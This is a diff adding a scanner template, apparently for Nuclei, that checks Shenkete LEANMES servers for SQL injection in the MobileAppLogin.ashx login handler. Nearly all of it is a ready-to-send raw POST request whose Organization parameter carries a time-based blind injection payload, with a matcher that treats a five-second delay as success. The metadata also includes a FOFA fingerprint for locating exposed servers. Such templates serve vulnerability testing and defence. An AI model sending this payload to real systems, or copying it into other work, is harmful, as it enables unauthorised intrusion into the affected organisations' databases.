@@ -1,0 +1,55 @@
+id: poc-qo8son67bo38gleg
+info:
+  name: 深科特LEANMES MobileAppLogin存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qo8son67bo38gleg
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qo8son67bo38gleg
+    fofa: icon_hash="1505132128"
+http:
+- raw:
+  - 'POST /Handler/MobileAppLogin.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Connection: keep-alive
+
+    sec-ch-ua: "Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"
+
+    sec-ch-ua-mobile: ?0
+
+    sec-ch-ua-platform: "Windows"
+
+    Upgrade-Insecure-Requests: 1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Sec-Fetch-Site: none
+
+    Sec-Fetch-Mode: navigate
+
+    Sec-Fetch-User: ?1
+
+    Sec-Fetch-Dest: document
+
+    Accept-Encoding: gzip, deflate, br, zstd
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Action=checkmesurl&Organization=''waitfor delay''0:0:5''--'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
